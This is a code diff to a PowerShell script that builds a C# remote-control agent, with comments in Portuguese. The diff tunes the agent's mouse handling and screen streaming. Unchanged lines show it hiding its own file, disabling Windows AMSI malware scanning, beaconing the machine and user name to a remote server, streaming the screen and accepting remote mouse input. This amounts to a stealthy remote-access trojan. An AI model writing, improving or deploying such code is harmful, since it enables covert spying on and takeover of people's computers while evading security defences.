@@ -23,7 +23,6 @@ try {
 } catch {}
 attrib +h +s +r $scriptPath 2>$null
 
-# AMSI Bypass silencioso
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -55,6 +54,10 @@ if (-not ("R9KAgent" -as [type])) {
         static bool streaming = false;
         static object writeLock = new object();
 
+        // Fila inteligente de mouse (evita lag e mouse fantasma)
+        static int targetX = -1, targetY = -1;
+        static bool hasNewPos = false;
+
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             while (true) {
@@ -69,18 +72,12 @@ if (-not ("R9KAgent" -as [type])) {
 
                     Send("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
-                    Thread tRead = new Thread(ReadLoop);
-                    tRead.IsBackground = true;
-                    tRead.Start();
-
-                    Thread tStream = new Thread(StreamLoop);
-                    tStream.IsBackground = true;
-                    tStream.Start();
+                    Thread tRead = new Thread(ReadLoop); tRead.IsBackground = true; tRead.Start();
+                    Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
+                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start(); // Thread dedicada ao mouse
 
                     while (client.Connected) Thread.Sleep(1000);
-                } catch {
-                    Thread.Sleep(3000);
-                }
+                } catch { Thread.Sleep(3000); }
             }
         }
 
@@ -99,16 +96,28 @@ if (-not ("R9KAgent" -as [type])) {
             } catch {}
         }
 
+        static void InputLoop() {
+            while (true) {
+                if (hasNewPos) {
+                    try {
+                        int px = (int)((targetX / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
+                        int py = (int)((targetY / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
+                        Cursor.Position = new Point(px, py);
+                    } catch {}
+                    hasNewPos = false;
+                }
+                Thread.Sleep(10); // Executa a 100Hz (super rápido)
+            }
+        }
+
         static void StreamLoop() {
             while (true) {
                 try {
                     if (streaming && client.Connected) {
-                        string b64 = CaptureScreen(1024, 35);
+                        string b64 = CaptureScreen(1280, 40); // Aumentado para 1280 e qualidade 40
                         if (b64 != null) Send("SCREEN:" + b64);
-                        Thread.Sleep(40); // ~25 FPS
-                    } else {
-                        Thread.Sleep(50);
-                    }
+                        Thread.Sleep(30); // 33 FPS de tela
+                    } else { Thread.Sleep(50); }
                 } catch { Thread.Sleep(1000); }
             }
         }
@@ -130,10 +139,9 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
-                    int nx = int.Parse(p[1]), ny = int.Parse(p[2]);
-                    int px = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
-                    int py = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
-                    Cursor.Position = new Point(px, py);
+                    targetX = int.Parse(p[1]);
+                    targetY = int.Parse(p[2]);
+                    hasNewPos = true; // Avisa a Thread de Input que há nova posição
                 }
                 else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                 else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
@@ -157,7 +165,7 @@ if (-not ("R9KAgent" -as [type])) {
                         int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBilinear;
+                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                             g2.DrawImage(bmp, 0, 0, newW, newH);
                         }
                     }
@@ -178,5 +186,4 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
-# Inicia o agente C#
 [R9KAgent]::Start($serverIP, $serverPort)
